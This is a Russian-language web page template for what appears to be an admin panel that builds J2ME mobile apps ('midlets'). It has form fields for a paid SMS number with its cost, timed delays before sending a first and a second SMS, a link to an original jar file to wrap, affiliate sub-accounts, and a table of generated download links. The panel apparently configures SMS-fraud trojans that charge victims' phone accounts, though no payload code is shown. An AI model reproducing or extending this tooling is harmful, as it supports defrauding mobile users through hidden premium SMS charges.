
<div class="page obratka">

<style>
.obratka .block .field .name {
	width: 125px;
	padding-right: 5px;
}

.obratka .block .field .sel select {
	width: 180px;
}
</style>
<script type="text/javascript" src="/javascript/jquery-1.3.2.js"></script>
<script>
$(function() {
	$("#create_show").click(function() {
		$("#midlet_block").toggle("normal");
	});
	
	$("#create_midlet").click(function() {
		$("#form").submit();
	});

});
</script>
</style>

	<div class="title">Мидлеты <span class="profil"><span class="link-send"><a href="#" id="create_show">[создать новый]</a></span></span></div>
	<br />
	<div class="block" {if (!$error) && (!$midlet->getId())}style="display:none;"{/if} id="midlet_block">
		
		{if $error}
			<div style="font-weight: bold; color: red;">{$error}</div>
		{/if}
		
		<form action="" method="post" id="form"  enctype="multipart/form-data">
			<input type="hidden" name ="MAX_FILE_SIZE" value="51200"> 
			<div class="field">
				<div class="name">Название приложения:</div>
				<div class="iput"><input type="text" name="name" default="{$midlet->getName()}" /></div>
				<div class="break"></div>
			</div>
			
			<div class="field">
				<div class="name">Тип мидлета:</div>
				<div class="sel">
					<select name="type" default="{$midlet->getTypeId()}">
						{foreach $types element}
							<option value="{$element->getId()}">{$element->getName()}</option>
						{/foreach}
					</select>
				</div>
				<div class="break"></div>
			</div>
			
			<div class="field">
				<div class="name">Номер СМС:</div>
				<div class="sel">
					<select name="sms_number" default="{$midlet->getSmsNumberId()}">
						{foreach $numbers element}
							<option value="{$element->getId()}">{$element->getName()} ({$element->getCost()})</option>
						{/foreach}
					</select>
				</div>
				<div class="break"></div>
			</div>
			
			<div class="field">
				<div class="name">Задержка перед отправкой первой СМС (мс):</div>
				<div class="iput"><input type="text" name="wait1" default="{$midlet->getSmsWait1()}" /></div>
				<div class="break"></div>
			</div>
			<div class="field">
				<div class="name">Задержка перед отправкой второй СМС (мс):</div>
				<div class="iput"><input type="text" name="wait2" default="{$midlet->getSmsWait2()}" /></div>
				<div class="break"></div>
			</div>	
			
			<div class="field">
				<div class="name">Прямая ссылка на исходный jar:</div>
				<div class="iput"><input type="text" name="url" default="{$midlet->getOriginalUrl()}"/></div>
				<div class="break"></div>
			</div>

			<div class="field">
				<div class="name">Субаккаунты:
				{if $midlet->getId()}
					<div style="margin-top: 7px;">
						<font size="-2">Отвязать старые субаккаунты, к сожалению, нельзя.<br />Можно добавить новые.</font>
					</div>{/if}
				</div>
				<div class="sel">
					<select name="subacc" multiple="multiple">
						{foreach $subaccs element}
							<option value="{$element.id}">{$element.key}</option>
						{/foreach}
					</select>
				</div>
				<div class="break"></div>
			</div>
			
		
			<div class="field">
				<div class="name">Иконка
					{if $midlet->getId()}
						(<img src='{$midlet->getExternalIconPath()}' width='32' height='32' />)
					{/if}:
				</div>
				<div class=""><input type="file" name="icon" /></div>
				<div class="break"></div>
			</div>
			<div class="field">
				<div class="name">Описание приложения:</div>
				<div class="textarea"><textarea name="description" default="{$midlet->getDescription()}"></textarea></div>
				<div class="break"></div>
			</div>
			<div class="field">
				<div class="name">Надпись на экране приветствия:</div>
				<div class="textarea"><textarea name="hello" default="{$midlet->getHelloMessage()}"></textarea></div>
				<div class="break"></div>
			</div>
			<div class="field">
				<div class="name">Надпись на экране прощания:</div>
				<div class="textarea"><textarea name="bye" default="{$midlet->getByeMessage()}"></textarea></div>
				<div class="break"></div>
			</div>
			
			<div class="profil">
				<div class="link-send">
					<a href="#" style="font-size: 15px;" id="create_midlet">{if $midlet->getId()}Редактировать мидлет{else}Создать мидлет{/if}</a>
			</div>
			
			</form>
		</div>
		
		<br /><br /><br /><br />
	</div>

{if count($table)}

	<table cellpadding="0" cellspacing="0" width="100%" id="idtbhistory">
		<tr>
			<td class="tb-tl">Название мидлета</th>
			<td class="tb-tl">Субаккаунт</th>
			<td class="tb-tl">Оригинальный файл</th>
			<td class="tb-tl">Сгенеренная ссылка</th>
			<td class="tb-tl">&nbsp;</td>
		</tr>
		{foreach $table element}
			<tr style="background:#E1E1E1;">
				<td>{$element.midlet.name}</td>
				<td>{$element.subacc.key}</td>
				<td>{$element.midlet.original_url}</td>
				<td>{$element.external_path}</td>
				<td><a href="{url(array(id = $element.midlet.id))}">Редактировать</a> | <a href="{url(array(id = $element.midlet.id, action = 'delete'))}">Удалить</a></td>
			</tr>
		{/foreach}
	</table>
{else}
	Нет готовых мидлетов.
{/if}

</div>
